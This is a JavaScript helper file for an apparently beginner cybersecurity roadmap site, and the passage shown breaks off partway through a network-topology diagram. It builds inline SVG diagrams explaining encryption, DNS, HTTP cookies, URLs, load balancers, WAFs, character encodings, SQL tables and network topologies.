/* ------------------------------------------------------------------
   Single source of truth for the roadmap.
   To fill in a course later, edit its entry: add `summary`,
   `contains` (array) and `study` (array). Pages update automatically.
   level: "easy" | "mid" | "hard"
------------------------------------------------------------------- */
/* ---------- Diagram helpers (inline SVG, styled by .dg in style.css) ---------- */
function dg(id, vb, body){
  return `<svg class="dg" viewBox="${vb}" role="img"><defs><marker id="ah-${id}" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" fill="currentColor"/></marker></defs>${body}</svg>`;
}
/* 5 boxes: plain -> encrypt -> cipher -> decrypt -> plain, with a key into boxes 2 and 4 */
function flowSVG(id, L, K, n1, n2){
  const xs = [20,170,320,470,620];
  const boxes = xs.map((x,i) => `<rect class="box${i==1||i==3?' acc':''}" x="${x}" y="80" width="110" height="50" rx="10"/><text x="${x+55}" y="110">${L[i]}</text>`).join("");
  const arrows = [0,1,2,3].map(i => `<line class="arr" x1="${xs[i]+112}" y1="105" x2="${xs[i+1]-2}" y2="105" marker-end="url(#ah-${id})"/>`).join("");
  const keys = [1,3].map((i,j) => `<line class="arr" x1="${xs[i]+55}" y1="40" x2="${xs[i]+55}" y2="78" marker-end="url(#ah-${id})"/><text x="${xs[i]+55}" y="28">${K[j]}</text>`).join("");
  return dg(id, "0 0 760 215", boxes + arrows + keys + `<text class="sm" x="380" y="165">${n1}</text><text class="sm" x="380" y="190">${n2}</text>`);
}
function plainCipherSVG(){
  return dg("pc", "0 0 700 175", `
    <rect class="box" x="30" y="40" width="190" height="70" rx="10"/><text class="big" x="125" y="85">HELLO</text>
    <text class="sm" x="125" y="135">Plaintext: readable by anyone</text>
    <line class="arr" x1="235" y1="75" x2="465" y2="75" marker-end="url(#ah-pc)"/>
    <text x="350" y="62">🔑 Encrypt (algorithm + key)</text>
    <rect class="box acc" x="480" y="40" width="190" height="70" rx="10"/><text class="big" x="575" y="85">KHOOR</text>
    <text class="sm" x="575" y="135">Ciphertext: nonsense without the key</text>`);
}
function lockboxSVG(){
  return dg("lb", "0 0 700 215", `
    <text class="sm" x="350" y="30">🕵️ Eavesdroppers can grab the box, but cannot open it</text>
    <text class="em" x="70" y="100">👩</text><text x="70" y="128">Alice</text><text class="sm" x="70" y="150">🔑 has the key</text>
    <text class="em" x="350" y="100">📦</text><text x="350" y="128">Locked box</text><text class="sm" x="350" y="150">(= ciphertext)</text>
    <text class="em" x="630" y="100">👨</text><text x="630" y="128">Bob</text><text class="sm" x="630" y="150">🔑 has the SAME key</text>
    <line class="arr" x1="115" y1="85" x2="295" y2="85" marker-end="url(#ah-lb)"/><text class="sm" x="205" y="72">locks with key</text>
    <line class="arr" x1="405" y1="85" x2="585" y2="85" marker-end="url(#ah-lb)"/><text class="sm" x="495" y="72">unlocks with same key</text>
    <text class="sm" x="350" y="195">Symmetric encryption: one key locks, the same key unlocks</text>`);
}
function caesarSVG(){
  const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  let s = `<text class="sm left" x="8" y="52">Plain</text><text class="sm left" x="8" y="112">Cipher</text>`;
  for(let i=0;i<26;i++){
    const x = 78 + i*25;
    s += `<text x="${x}" y="52">${A[i]}</text><line class="thin" x1="${x}" y1="60" x2="${x}" y2="96"/><text class="g" x="${x}" y="112">${A[(i+3)%26]}</text>`;
  }
  s += `<text class="sm" x="370" y="148">Key = 3: every letter moves 3 places forward (X→A, Y→B, Z→C wrap around)</text>`;
  s += `<text class="big" x="370" y="182">HELLO → KHOOR</text>`;
  return dg("cz", "0 0 740 200", s);
}
function mailboxSVG(){
  return dg("mb", "0 0 700 215", `
    <text class="em" x="70" y="100">👩</text><text x="70" y="128">Alice</text><text class="sm" x="70" y="150">(sender)</text>
    <text class="em" x="350" y="100">📬</text><text x="350" y="128">Bob's mailbox</text>
    <text class="em" x="630" y="100">👨</text><text x="630" y="128">Bob</text><text class="sm" x="630" y="150">🔑 holds PRIVATE key</text>
    <line class="arr" x1="115" y1="85" x2="295" y2="85" marker-end="url(#ah-mb)"/>
    <text class="sm" x="205" y="62">Drops letter in the slot</text><text class="sm" x="205" y="76">= encrypt with PUBLIC key</text>
    <line class="arr" x1="405" y1="85" x2="585" y2="85" marker-end="url(#ah-mb)"/>
    <text class="sm" x="495" y="62">Only the owner's key opens it</text><text class="sm" x="495" y="76">= decrypt with PRIVATE key</text>
    <text class="sm" x="350" y="195">Asymmetric encryption: two different keys, one to lock, one to unlock</text>`);
}
function httpsSVG(){
  return dg("ht", "0 0 700 215", `
    <text class="em" x="60" y="100">🖥️</text><text x="60" y="128">Your browser</text>
    <text class="em" x="640" y="100">🌐</text><text x="640" y="128">Website server</text>
    <text class="sm" x="350" y="38">1. Asymmetric: agree on a shared secret key</text>
    <line class="arr" x1="125" y1="55" x2="575" y2="55" marker-start="url(#ah-ht)" marker-end="url(#ah-ht)"/>
    <text class="sm" x="350" y="74">(the server proves who it is with a certificate)</text>
    <text class="sm" x="350" y="140">2. Symmetric: all the data is encrypted with that key (fast)</text>
    <line class="arr" x1="125" y1="157" x2="575" y2="157" marker-start="url(#ah-ht)" marker-end="url(#ah-ht)"/>
    <text class="sm" x="350" y="195">This mix is called a hybrid approach</text>`);
}
function certSVG(){
  return dg("ct", "0 0 460 200", `
    <rect class="box" x="20" y="10" width="420" height="180" rx="12"/>
    <text x="230" y="40">🔒 Digital certificate</text>
    <text class="left" x="45" y="75">Issued to:  example.com (who the key belongs to)</text>
    <text class="left" x="45" y="100">Public key:  the website's public key</text>
    <text class="left" x="45" y="125">Issued by:  a trusted Certificate Authority (CA)</text>
    <text class="left" x="45" y="150">Valid from / until:  start and expiry dates</text>
    <text class="left" x="45" y="175">Digitally signed by the CA ✔</text>`);
}

/* Row of boxes with arrows. Use "|" in a label to break it into two lines. cls "acc" highlights a box. */
function rowSVG(id, labels, hi){
  const n = labels.length, w = 150, gap = 40, h = 64, W = n*w + (n-1)*gap + 40;
  let s = "";
  labels.forEach((t, i) => {
    const x = 20 + i*(w+gap), parts = t.split("|");
    const hl = hi && hi.includes(i) ? " acc" : "";
    s += `<rect class="box${hl}" x="${x}" y="20" width="${w}" height="${h}" rx="10"/>`;
    parts.forEach((p, j) => {
      const y = parts.length === 1 ? 57 : 46 + j*20;
      s += `<text class="${j ? 'sm' : ''}" x="${x+w/2}" y="${y}">${p}</text>`;
    });
    if(i < n-1) s += `<line class="arr" x1="${x+w+2}" y1="52" x2="${x+w+gap-2}" y2="52" marker-end="url(#ah-${id})"/>`;
  });
  return dg(id, `0 0 ${W} 104`, s);
}

/* "City" map of a client's infrastructure: Internet -> Firewall (gate) -> network with devices and servers */
function cityMapSVG(){
  return dg("city", "0 0 700 260", `
    <rect class="box" x="255" y="15" width="430" height="230" rx="14"/>
    <text x="470" y="42">The client's network = the city</text>
    <rect class="box" x="15" y="95" width="115" height="70" rx="10"/><text x="72" y="125">🌍 Internet</text><text class="sm" x="72" y="147">outside the city</text>
    <rect class="box acc" x="165" y="85" width="60" height="90" rx="10"/><text x="195" y="124" style="font-size:22px">🚧</text><text class="sm" x="195" y="150">Firewall</text><text class="sm" x="195" y="190">city gate</text>
    <line class="arr" x1="132" y1="130" x2="163" y2="130" marker-end="url(#ah-city)"/>
    <line class="arr" x1="227" y1="130" x2="253" y2="130" marker-end="url(#ah-city)"/>
    <rect class="box" x="275" y="75" width="115" height="110" rx="10"/><text x="332" y="112" class="em" style="font-size:28px">💻</text><text x="332" y="145">Employee devices</text><text class="sm" x="332" y="166">= homes</text>
    <rect class="box" x="415" y="75" width="115" height="110" rx="10"/><text x="472" y="112" class="em" style="font-size:28px">🛒</text><text x="472" y="145">Web server</text><text class="sm" x="472" y="166">= shop / public building</text>
    <rect class="box" x="555" y="75" width="115" height="110" rx="10"/><text x="612" y="112" class="em" style="font-size:28px">📮</text><text x="612" y="145">Mail server</text><text class="sm" x="612" y="166">= post office</text>
    <text class="sm" x="470" y="225">Defenders must map the network before they can protect it</text>`);
}

/* DNS diagrams */
function domainTreeSVG(){
  const tld = [["edu",110],["com",270],["gov",450],["mil",600]];
  const sld = [["MIT",110,110],["Tryhackme",270,215],["Google",270,325],["USA",450,405],["NASA",450,495],["Army",600,600]];
  let s = `<circle cx="22" cy="22" r="6" fill="#e5384f"/><text class="sm left" x="34" y="26">Root domain</text>
           <circle cx="22" cy="44" r="6" fill="#29a3e8"/><text class="sm left" x="34" y="48">Top-level domain (TLD)</text>
           <circle cx="22" cy="66" r="6" fill="#8bd450"/><text class="sm left" x="34" y="70">Second-level domain</text>`;
  tld.forEach(t => { s += `<line class="arr" x1="350" y1="56" x2="${t[1]}" y2="111"/>`; });
  sld.forEach(d => { s += `<line class="arr" x1="${d[1]}" y1="129" x2="${d[2]}" y2="196"/>`; });
  s += `<circle cx="350" cy="45" r="11" fill="#e5384f"/><text class="sm" x="350" y="24">"." (root)</text>`;
  tld.forEach(t => { s += `<circle cx="${t[1]}" cy="120" r="9" fill="#29a3e8"/><text class="sm left" x="${t[1]+14}" y="124">.${t[0]}</text>`; });
  sld.forEach(d => { s += `<circle cx="${d[2]}" cy="205" r="9" fill="#8bd450"/><text class="sm" x="${d[2]}" y="232">${d[0]}</text>`; });
  return dg("dtree", "0 0 700 250", s);
}
function domainPartsSVG(){
  return dg("dparts", "0 0 700 150", `
    <rect class="box" x="40" y="25" width="170" height="50" rx="10"/><text class="big" x="125" y="58" style="font-size:20px">admin</text>
    <text class="big" x="237" y="60">.</text>
    <rect class="box acc" x="265" y="25" width="170" height="50" rx="10"/><text class="big" x="350" y="58" style="font-size:20px">tryhackme</text>
    <text class="big" x="462" y="60">.</text>
    <rect class="box" x="490" y="25" width="170" height="50" rx="10"/><text class="big" x="575" y="58" style="font-size:20px">com</text>
    <text class="sm" x="125" y="98">Subdomain</text>
    <text class="sm" x="350" y="98">Second-level domain</text>
    <text class="sm" x="575" y="98">Top-level domain (TLD)</text>
    <text class="sm" x="350" y="132">Read from right to left: TLD, then second-level domain, then subdomain</text>`);
}
function dnsRequestSVG(){
  const names = [["💻 Your computer","checks local cache"],["Recursive DNS","usually your ISP"],["Root server","points to the TLD"],["TLD server","e.g. .com servers"],["Authoritative","holds the records"]];
  let s = "";
  names.forEach((n, i) => {
    const x = 15 + i*145;
    s += `<rect class="box${i==4?' acc':''}" x="${x}" y="35" width="115" height="62" rx="10"/><text x="${x+57}" y="62">${n[0]}</text><text class="sm" x="${x+57}" y="82">${n[1]}</text>`;
    if(i < 4) s += `<line class="arr" x1="${x+117}" y1="66" x2="${x+143}" y2="66" marker-end="url(#ah-dreq)"/>`;
  });
  s += `<text class="sm" x="365" y="22">1 to 4: the request is passed along until someone knows the answer</text>`;
  s += `<path class="arr" d="M652 100 V150 H72 V101" marker-end="url(#ah-dreq)"/>`;
  s += `<text class="sm" x="365" y="170">5: the answer travels back, the recursive server caches it (TTL), and your computer gets the IP address</text>`;
  return dg("dreq", "0 0 730 190", s);
}

/* HTTP diagrams */
function httpCompareSVG(){
  return dg("hh", "0 0 700 170", `
    <rect class="box" x="20" y="15" width="110" height="50" rx="10"/><text x="75" y="46">💻 Browser</text>
    <rect class="box" x="570" y="15" width="110" height="50" rx="10"/><text x="625" y="46">🖥️ Server</text>
    <line class="arr" x1="134" y1="40" x2="566" y2="40" marker-start="url(#ah-hh)" marker-end="url(#ah-hh)"/>
    <text class="sm" x="350" y="30">HTTP: data travels as plain, readable text</text>
    <text class="sm" x="350" y="58">anyone on the path could read it or pretend to be the server</text>
    <rect class="box" x="20" y="95" width="110" height="50" rx="10"/><text x="75" y="126">💻 Browser</text>
    <rect class="box acc" x="570" y="95" width="110" height="50" rx="10"/><text x="625" y="126">🖥️ Server</text>
    <line class="arr" x1="134" y1="120" x2="566" y2="120" marker-start="url(#ah-hh)" marker-end="url(#ah-hh)"/>
    <text class="sm" x="350" y="110">HTTPS: 🔒 data is encrypted</text>
    <text class="sm" x="350" y="138">and you know you are talking to the real server</text>`);
}
function urlSVG(){
  const p = [["http://","Scheme"],["user:password@","User"],["tryhackme.com","Host"],[":80","Port"],["/view-room","Path"],["?id=1","Query string"],["#task3","Fragment"]];
  let s = "";
  p.forEach((q, i) => {
    const x = 10 + i*100;
    s += `<rect class="box${i==2?' acc':''}" x="${x}" y="15" width="96" height="40" rx="8"/><text x="${x+48}" y="40" style="font-size:11.5px">${q[0]}</text><text class="sm" x="${x+48}" y="76">${q[1]}</text>`;
  });
  return dg("url", "0 0 710 95", s);
}
function cookieFlowSVG(){
  const steps = [
    ["R","1. GET /  (client asks for cookies.thm)"],
    ["L","2. 200 OK: a page with a form asking for your name"],
    ["R","3. POST name=adam  (client sends the form back)"],
    ["L","4. 200 OK + Set-Cookie: name=adam"],
    ["R","5. GET /  + Cookie: name=adam  (sent on every later request)"],
    ["L","6. 200 OK: Welcome back adam  (no form this time)"]
  ];
  let s = `<text x="95" y="24">💻 Client</text><text x="605" y="24">🖥️ Server</text>
           <line class="thin" x1="95" y1="34" x2="95" y2="310"/><line class="thin" x1="605" y1="34" x2="605" y2="310"/>`;
  steps.forEach((t, i) => {
    const y = 70 + i*44, x1 = t[0]==="R" ? 99 : 601, x2 = t[0]==="R" ? 601 : 99;
    s += `<line class="arr" x1="${x1}" y1="${y}" x2="${x2}" y2="${y}" marker-end="url(#ah-ck)"/><text class="sm" x="350" y="${y-8}">${t[1]}</text>`;
  });
  return dg("ck", "0 0 700 330", s);
}

/* How Websites Work diagrams */
function webFlowSVG(){
  return dg("wf", "0 0 700 165", `
    <rect class="box" x="30" y="30" width="120" height="80" rx="12"/><text class="em" x="90" y="75" style="font-size:30px">💻</text><text x="90" y="100">Browser</text>
    <rect class="box" x="290" y="30" width="120" height="80" rx="12"/><text class="em" x="350" y="75" style="font-size:30px">☁️</text><text x="350" y="100">Internet</text>
    <rect class="box acc" x="550" y="30" width="120" height="80" rx="12"/><text class="em" x="610" y="75" style="font-size:30px">🖥️</text><text x="610" y="100">Server</text>
    <line class="arr" x1="154" y1="52" x2="286" y2="52" marker-end="url(#ah-wf)"/><text class="sm" x="220" y="42">Request from browser</text>
    <line class="arr" x1="286" y1="92" x2="154" y2="92" marker-end="url(#ah-wf)"/><text class="sm" x="220" y="108">Response from server</text>
    <line class="arr" x1="414" y1="52" x2="546" y2="52" marker-end="url(#ah-wf)"/><text class="sm" x="480" y="42">Request from browser</text>
    <line class="arr" x1="546" y1="92" x2="414" y2="92" marker-end="url(#ah-wf)"/><text class="sm" x="480" y="108">Response from server</text>
    <text class="sm" x="90" y="136">Front end (client side)</text>
    <text class="sm" x="610" y="136">Back end (server side)</text>`);
}
function htmlTreeSVG(){
  const node = (x, y, t, hi) => `<rect class="box${hi?' acc':''}" x="${x-50}" y="${y-18}" width="100" height="36" rx="8"/><text x="${x}" y="${y+5}">${t}</text>`;
  return dg("htree", "0 0 700 215", `
    <line class="arr" x1="350" y1="53" x2="210" y2="82"/><line class="arr" x1="350" y1="53" x2="490" y2="82"/>
    <line class="arr" x1="210" y1="118" x2="210" y2="152"/>
    <line class="arr" x1="490" y1="118" x2="430" y2="152"/><line class="arr" x1="490" y1="118" x2="570" y2="152"/>
    ${node(350,35,"&lt;html&gt;",true)}
    ${node(210,100,"&lt;head&gt;")}${node(490,100,"&lt;body&gt;")}
    ${node(210,170,"&lt;title&gt;")}${node(430,170,"&lt;h1&gt;")}${node(570,170,"&lt;p&gt;")}
    <text class="sm" x="210" y="205">page title</text><text class="sm" x="430" y="205">large heading</text><text class="sm" x="570" y="205">paragraph</text>`);
}

/* Putting it all together diagrams */
function putTogetherFlowSVG(){
  return dg("ptf", "0 0 760 180", `
    <rect class="box" x="20" y="30" width="150" height="70" rx="10"/>
    <text class="em" x="95" y="70" style="font-size:26px">🖥️</text><text x="95" y="90">1. Browser</text>
    <text class="sm" x="95" y="125">Request website URL</text>

    <line class="arr" x1="172" y1="65" x2="218" y2="65" marker-end="url(#ah-ptf)"/>

    <rect class="box" x="220" y="30" width="150" height="70" rx="10"/>
    <text class="em" x="295" y="70" style="font-size:26px">🌍</text><text x="295" y="90">2. DNS</text>
    <text class="sm" x="295" y="125">Resolve name to IP</text>

    <line class="arr" x1="372" y1="65" x2="418" y2="65" marker-end="url(#ah-ptf)"/>

    <rect class="box acc" x="420" y="30" width="150" height="70" rx="10"/>
    <text class="em" x="495" y="70" style="font-size:26px">🗄️</text><text x="495" y="90">3. Web Server</text>
    <text class="sm" x="495" y="125">Connect port 80/443</text>

    <line class="arr" x1="572" y1="65" x2="618" y2="65" marker-end="url(#ah-ptf)"/>

    <rect class="box" x="620" y="30" width="120" height="70" rx="10"/>
    <text class="em" x="680" y="70" style="font-size:26px">✨</text><text x="680" y="90">4. View</text>
    <text class="sm" x="680" y="125">HTML/CSS/JS render</text>
    <text class="sm" x="380" y="160">End-to-end journey of every webpage request</text>`);
}

function loadBalancerSVG(){
  return dg("lb2", "0 0 720 220", `
    <rect class="box" x="20" y="80" width="120" height="60" rx="10"/>
    <text x="80" y="108">💻 Client</text>
    <text class="sm" x="80" y="128">Many visitors</text>

    <line class="arr" x1="142" y1="110" x2="228" y2="110" marker-end="url(#ah-lb2)"/>
    <text class="sm" x="185" y="100">Requests</text>

    <rect class="box acc" x="230" y="65" width="180" height="90" rx="12"/>
    <text x="320" y="95" class="g" style="font-weight:700">⚖️ Load Balancer</text>
    <text class="sm" x="320" y="118">Round-Robin / Weighted</text>
    <text class="sm" x="320" y="138">❤️ Regular Health Checks</text>

    <path class="arr" d="M 412 85 Q 460 50 518 40" marker-end="url(#ah-lb2)"/>
    <rect class="box" x="520" y="15" width="170" height="48" rx="8"/>
    <text x="605" y="38">🖥️ Server 1</text><text class="sm" x="605" y="54">Active</text>

    <line class="arr" x1="412" y1="110" x2="518" y2="110" marker-end="url(#ah-lb2)"/>
    <rect class="box" x="520" y="85" width="170" height="48" rx="8"/>
    <text x="605" y="108">🖥️ Server 2</text><text class="sm" x="605" y="124">Active</text>

    <path class="arr" d="M 412 135 Q 460 170 518 180" marker-end="url(#ah-lb2)"/>
    <rect class="box" x="520" y="155" width="170" height="48" rx="8"/>
    <text x="605" y="178">🖥️ Server 3</text><text class="sm" x="605" y="194">Active / Failover</text>`);
}

function wafSVG(){
  return dg("waf", "0 0 700 190", `
    <rect class="box" x="30" y="60" width="130" height="70" rx="10"/>
    <text x="95" y="92">💻 Client</text>
    <text class="sm" x="95" y="112">Browser / Bot</text>

    <line class="arr" x1="162" y1="95" x2="258" y2="95" marker-end="url(#ah-waf)"/>
    <text class="sm" x="210" y="85">Web Traffic</text>

    <rect class="box acc" x="260" y="35" width="190" height="120" rx="12"/>
    <text x="355" y="68" class="g" style="font-weight:700">🛡️ WAF</text>
    <text class="sm" x="355" y="90">Web App Firewall</text>
    <text class="sm" x="355" y="112">• Blocks attacks &amp; bots</text>
    <text class="sm" x="355" y="132">• Enforces rate limits</text>

    <line class="arr" x1="452" y1="95" x2="528" y2="95" marker-end="url(#ah-waf)"/>
    <text class="sm" x="490" y="85" style="fill:var(--accent)">Clean requests</text>

    <rect class="box" x="530" y="60" width="140" height="70" rx="10"/>
    <text x="600" y="92">🖥️ Web Server</text>
    <text class="sm" x="600" y="112">Protected Backend</text>`);
}

/* Software Basics diagrams */
function bitBulbSVG(){
  return dg("bulb", "0 0 700 200", `
    <!-- Bulb 1: ON (1) -->
    <g transform="translate(130, 20)">
      <circle cx="70" cy="65" r="48" fill="#ffd166" fill-opacity="0.25" filter="drop-shadow(0 0 16px rgba(255,209,102,0.6))"/>
      <circle cx="70" cy="65" r="38" fill="#ffd166" stroke="#ffb703" stroke-width="2"/>
      <path d="M 52 90 L 88 90 L 82 110 L 58 110 Z" fill="#6c757d"/>
      <text x="70" y="60" text-anchor="middle" font-size="28" font-weight="900" fill="#0f172a">1</text>
      <text x="70" y="80" text-anchor="middle" font-size="12" font-weight="700" fill="#0f172a">ON</text>
      <text x="70" y="145" text-anchor="middle" font-size="14" font-weight="700" fill="#ffd166">State: 1 (True / High)</text>
      <text x="70" y="165" text-anchor="middle" class="sm" fill="var(--muted)">Voltage &gt; 2.0V / Current flows</text>
    </g>

    <!-- Divider / VS -->
    <text x="350" y="105" text-anchor="middle" font-size="20" font-weight="900" fill="var(--muted)">VS</text>

    <!-- Bulb 0: OFF (0) -->
    <g transform="translate(430, 20)">
      <circle cx="70" cy="65" r="38" fill="#334155" stroke="#475569" stroke-width="2"/>
      <path d="M 52 90 L 88 90 L 82 110 L 58 110 Z" fill="#475569"/>
      <text x="70" y="60" text-anchor="middle" font-size="28" font-weight="900" fill="#94a3b8">0</text>
      <text x="70" y="80" text-anchor="middle" font-size="12" font-weight="700" fill="#94a3b8">OFF</text>
      <text x="70" y="145" text-anchor="middle" font-size="14" font-weight="700" fill="#94a3b8">State: 0 (False / Low)</text>
      <text x="70" y="165" text-anchor="middle" class="sm" fill="var(--muted)">Voltage &lt; 0.8V / No current</text>
    </g>`);
}

function rgbVennSVG(){
  return dg("rgb", "0 0 700 240", `
    <g transform="translate(140, 20)">
      <!-- Red circle -->
      <circle cx="160" cy="80" r="65" fill="#ef4444" fill-opacity="0.65" stroke="#ef4444" stroke-width="2"/>
      <!-- Green circle -->
      <circle cx="260" cy="80" r="65" fill="#22c55e" fill-opacity="0.65" stroke="#22c55e" stroke-width="2"/>
      <!-- Blue circle -->
      <circle cx="210" cy="145" r="65" fill="#3b82f6" fill-opacity="0.65" stroke="#3b82f6" stroke-width="2"/>
      
      <!-- Labels -->
      <text x="135" y="60" font-size="15" font-weight="800" fill="#ffffff">RED</text>
      <text x="135" y="78" font-size="11" fill="#fecaca">(100)</text>

      <text x="285" y="60" font-size="15" font-weight="800" fill="#ffffff">GREEN</text>
      <text x="285" y="78" font-size="11" fill="#bbf7d0">(010)</text>

      <text x="210" y="195" font-size="15" font-weight="800" fill="#ffffff" text-anchor="middle">BLUE</text>
      <text x="210" y="210" font-size="11" fill="#bfdbfe" text-anchor="middle">(001)</text>

      <!-- Overlaps -->
      <text x="210" y="72" font-size="12" font-weight="700" fill="#fef08a" text-anchor="middle">YELLOW (110)</text>
      <text x="160" y="130" font-size="12" font-weight="700" fill="#f5d0fe" text-anchor="middle">MAGENTA (101)</text>
      <text x="260" y="130" font-size="12" font-weight="700" fill="#a5f3fc" text-anchor="middle">CYAN (011)</text>
      <text x="210" y="112" font-size="12" font-weight="900" fill="#ffffff" text-anchor="middle">WHITE (111)</text>
    </g>

    <g transform="translate(480, 45)">
      <rect class="box" x="0" y="0" width="190" height="150" rx="10"/>
      <text x="95" y="30" font-weight="700" fill="var(--accent)" text-anchor="middle">3-Bit vs 24-Bit</text>
      <text class="sm left" x="15" y="58">• 3 bits = 8 base colors</text>
      <text class="sm left" x="15" y="82">• 24-bit TrueColor = 3 bytes</text>
      <text class="sm left" x="15" y="104">• 256 × 256 × 256 levels</text>
      <text class="sm left" x="15" y="126" font-weight="700" fill="#22c55e">• 16.7 Million Colors!</text>
    </g>`);
}

function utfComparisonSVG(){
  return dg("utf", "0 0 700 210", `
    <!-- UTF-8 -->
    <rect class="box" x="25" y="25" width="200" height="160" rx="10"/>
    <text x="125" y="55" font-weight="800" font-size="16" fill="var(--accent)">UTF-8</text>
    <text class="sm" x="125" y="78">1 to 4 Bytes (Dynamic)</text>
    <line x1="45" y1="92" x2="205" y2="92" stroke="var(--border)"/>
    <text class="sm left" x="45" y="115">'A' (ASCII) : 1 Byte (0x41)</text>
    <text class="sm left" x="45" y="138">'Ω' (Greek) : 2 Bytes</text>
    <text class="sm left" x="45" y="161">'🔥' (Emoji) : 4 Bytes</text>
    <text class="sm" x="125" y="177" fill="#22c55e" font-weight="700">Web standard (compact)</text>

    <!-- UTF-16 -->
    <rect class="box" x="250" y="25" width="200" height="160" rx="10"/>
    <text x="350" y="55" font-weight="800" font-size="16" fill="#38bdf8">UTF-16</text>
    <text class="sm" x="350" y="78">2 or 4 Bytes (Dynamic)</text>
    <line x1="270" y1="92" x2="430" y2="92" stroke="var(--border)"/>
    <text class="sm left" x="270" y="115">'A' (ASCII) : 2 Bytes</text>
    <text class="sm left" x="270" y="138">'Ω' (Greek) : 2 Bytes</text>
    <text class="sm left" x="270" y="161">'🔥' (Emoji) : 4 Bytes (pairs)</text>
    <text class="sm" x="350" y="177" fill="#38bdf8" font-weight="700">Used by Java &amp; Windows</text>

    <!-- UTF-32 -->
    <rect class="box" x="475" y="25" width="200" height="160" rx="10"/>
    <text x="575" y="55" font-weight="800" font-size="16" fill="#a855f7">UTF-32</text>
    <text class="sm" x="575" y="78">Always 4 Bytes (Fixed)</text>
    <line x1="495" y1="92" x2="655" y2="92" stroke="var(--border)"/>
    <text class="sm left" x="495" y="115">'A' (ASCII) : 4 Bytes</text>
    <text class="sm left" x="495" y="138">'Ω' (Greek) : 4 Bytes</text>
    <text class="sm left" x="495" y="161">'🔥' (Emoji) : 4 Bytes</text>
    <text class="sm" x="575" y="177" fill="#f87171" font-weight="700">Simple but memory heavy</text>`);
}

function sqlTableSVG(){
  return dg("sqltbl", "0 0 700 230", `
    <!-- Table Header banner -->
    <rect class="box acc" x="120" y="20" width="460" height="35" rx="6"/>
    <text x="350" y="43" font-weight="800" font-size="15" fill="var(--accent)">📊 Table: Orders</text>

    <!-- Column Headers -->
    <rect class="box" x="120" y="60" width="70" height="35"/>
    <text x="155" y="82" font-weight="700">id</text>
    <rect class="box" x="190" y="60" width="130" height="35"/>
    <text x="255" y="82" font-weight="700">drink</text>
    <rect class="box" x="320" y="60" width="110" height="35"/>
    <text x="375" y="82" font-weight="700">price</text>
    <rect class="box" x="430" y="60" width="150" height="35"/>
    <text x="505" y="82" font-weight="700">time</text>

    <!-- Row 1 -->
    <rect fill="var(--bg-card)" stroke="var(--border)" x="120" y="95" width="70" height="32"/>
    <text class="sm" x="155" y="116">1</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="190" y="95" width="130" height="32"/>
    <text class="sm" x="255" y="116">Coffee</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="320" y="95" width="110" height="32"/>
    <text class="sm" x="375" y="116">2.00</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="430" y="95" width="150" height="32"/>
    <text class="sm" x="505" y="116">11:00 AM</text>

    <!-- Row 2 -->
    <rect fill="var(--bg-card)" stroke="var(--border)" x="120" y="127" width="70" height="32"/>
    <text class="sm" x="155" y="148">2</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="190" y="127" width="130" height="32"/>
    <text class="sm" x="255" y="148">Tea</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="320" y="127" width="110" height="32"/>
    <text class="sm" x="375" y="148">1.50</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="430" y="127" width="150" height="32"/>
    <text class="sm" x="505" y="148">11:10 AM</text>

    <!-- Row 3 -->
    <rect fill="var(--bg-card)" stroke="var(--border)" x="120" y="159" width="70" height="32"/>
    <text class="sm" x="155" y="180">3</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="190" y="159" width="130" height="32"/>
    <text class="sm" x="255" y="180">Muffin</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="320" y="159" width="110" height="32"/>
    <text class="sm" x="375" y="180">2.50</text>
    <rect fill="var(--bg-card)" stroke="var(--border)" x="430" y="159" width="150" height="32"/>
    <text class="sm" x="505" y="180">11:15 AM</text>

    <!-- Row callout -->
    <line class="arr" x1="85" y1="143" x2="115" y2="143" marker-end="url(#ah-sqltbl)"/>
    <text class="sm left" x="8" y="147" font-weight="700" fill="#38bdf8">Row (Record)</text>

    <!-- Column callout -->
    <line class="arr" x1="375" y1="218" x2="375" y2="195" marker-end="url(#ah-sqltbl)"/>
    <text x="375" y="226" font-weight="700" fill="#f59e0b" text-anchor="middle">Column (Field / Attribute)</text>`);
}

function networkTopologySVG(){
  return dg("topol", "0 0 740 230", `
    <!-- Star Topology -->
    <g transform="translate(10, 15)">
      <rect class="box" x="0" y="0" width="220" height="200" rx="10"/>
      <text x="110" y="28" font-weight="700" fill="var(--accent)">Star Topology</text>
      <!-- Central switch -->
      <circle cx="110" cy="95" r="18" fill="#243320" stroke="var(--accent)" stroke-width="2"/>
      <text x="110" y="99" font-size="11" fill="var(--accent)" font-weight="700">Switch</text>
      <!-- Surrounding nodes -->
      <circle cx="55" cy="55" r="13" class="box"/>
      <text x="55" y="59" font-size="10">PC1</text>
      <line class="arr" x1="68" y1="65" x2="95" y2="85"/>
      <circle cx="165" cy="55" r="13" class="box"/>
      <text x="165" y="59" font-size="10">PC2</text>
      <line class="arr" x1="152" y1="65" x2="125" y2="85"/>
      <circle cx="55" cy="135" r="13" class="box"/>
      <text x="55" y="139" font-size="10">PC3</text>
      <line class="arr" x1="68" y1="125" x2="95" y2="105"/>
      <circle cx="165" cy="135" r="13" class="box"/>
      <text x="165" y="139" font-size="10">PC4</text>
      <line class="arr" x1="152" y1="125" x2="125" y2="105"/>
      <text class="sm" x="110" y="170">High reliability &amp; scalability</text>
      <text class="sm" x="110" y="188" font-size="11" fill="#f87171">Switch is single failure point</text>
    </g>

    <!-- Bus Topology -->
    <g transform="translate(260, 15)">
      <rect class="box" x="0" y="0" width="220" height="200" rx="10"/>
      <text x="110" y="28" font-weight="700" fill="#38bdf8">Bus Topology</text>
      <!-- Backbone cable -->
      <line x1="25" y1="95" x2="195" y2="95" stroke="#38bdf8" stroke-width="4"/>
      <!-- Terminators -->
      <rect x="20" y="85" width="8" height="20" fill="#f59e0b" rx="2"/>
      <rect x="192" y="85" width="8" height="20" fill="#f59e0b" rx="2"/>
      <!-- Drop lines and nodes -->
      <line class="thin" x1="55" y1="95" x2="55" y2="60"/>
      <circle cx="55" cy="50" r="12" class="box"/>
